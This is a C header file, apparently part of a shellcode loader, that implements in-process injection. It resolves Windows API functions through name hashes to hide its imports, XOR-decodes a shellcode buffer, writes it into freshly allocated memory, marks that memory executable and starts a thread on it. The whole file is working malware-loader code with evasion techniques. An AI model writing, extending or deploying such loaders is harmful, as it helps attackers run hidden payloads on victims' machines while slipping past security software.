//injection logic
#pragma once
#include <Windows.h>
#include <stdio.h>
#include "HashyHashy.h"
#include "TypeDef.h"

extern LPVOID g_baseAddr;
extern LPVOID g_vpPtr;
extern LPVOID g_vaPtr;
extern LPVOID g_wpmPtr;
extern LPVOID g_ctrPtr;

LPVOID getHashedFunctionPointer(LPCSTR lib, LPCSTR funcName)
{


	UINT32 supafastHash;
	LPVOID funcAddr = NULL;
	supafastHash = HashStringSuperFastHashA(funcName);
	funcAddr = getFunctionAddressByHash(lib, supafastHash);
	return funcAddr;
}

VOID XORData(PCHAR shellcode, PCHAR key, SIZE_T bufferSize)
{
	for (int i = 0; i < bufferSize; ++i) {
		shellcode[i] = shellcode[i] ^ key[i % 0xFF];
	}

}

BOOL ChangeMemProtection(PVOID baseAddr, SIZE_T bufferSize, DWORD protection)
{
	DWORD oldProtect;

	mVirtualProtect VirtualProtect = (mVirtualProtect)g_vpPtr;
	VirtualProtect(baseAddr, bufferSize, protection, &oldProtect);
	return TRUE;
}


HANDLE CreateShellCodeThread(PVOID shellcode, SIZE_T bufferSize, HANDLE procHandle)
{
	SIZE_T bytesWritten = 0;
	HANDLE shellcodeThreadHandle = NULL;
	DWORD oldProtect;
	mVirtualAlloc VirtualAlloc = (mVirtualAlloc)g_vaPtr;
	mWriteProcessMemory WriteProcessMemory = (mWriteProcessMemory)g_wpmPtr;
	mCreateThread CreateThread = (mCreateThread)g_ctrPtr;

	if (procHandle == GetCurrentProcess())
	{
		g_baseAddr = VirtualAlloc(NULL, bufferSize, (MEM_RESERVE | MEM_COMMIT), 0x40);
		BOOL success = WriteProcessMemory(procHandle, g_baseAddr, shellcode, bufferSize, &bytesWritten);
		if (success)
		{
			success = ChangeMemProtection(g_baseAddr, bufferSize, PAGE_EXECUTE_READ);
			if (success)
			{
				shellcodeThreadHandle = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)g_baseAddr, NULL, 0, NULL);
			}
		}
		else
		{
			printf_s("error: %lu", GetLastError());
			ExitProcess(-1);
		}
	}
	else
	{
		printf_s("not implemented");
		ExitProcess(-1);
	}
	return shellcodeThreadHandle;
}